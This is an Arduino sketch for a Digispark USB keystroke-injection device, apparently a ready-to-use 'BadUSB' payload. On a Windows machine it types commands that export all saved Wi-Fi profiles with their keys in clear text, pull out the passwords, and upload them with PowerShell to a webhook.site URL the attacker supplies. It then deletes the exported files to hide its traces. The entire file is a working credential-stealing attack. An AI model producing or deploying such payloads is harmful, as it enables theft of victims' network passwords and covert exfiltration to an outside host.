#include "DigiKeyboard.h"
void setup() {
  }

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd %temp%");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
  DigiKeyboard.delay(500);
  //search https://webhook.site and paste your unique URL
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri   https://webhook.site/YOURURL  -Method POST -InFile Wi-Fi-PASS");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("del Wi-* /s /f /q");
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
}
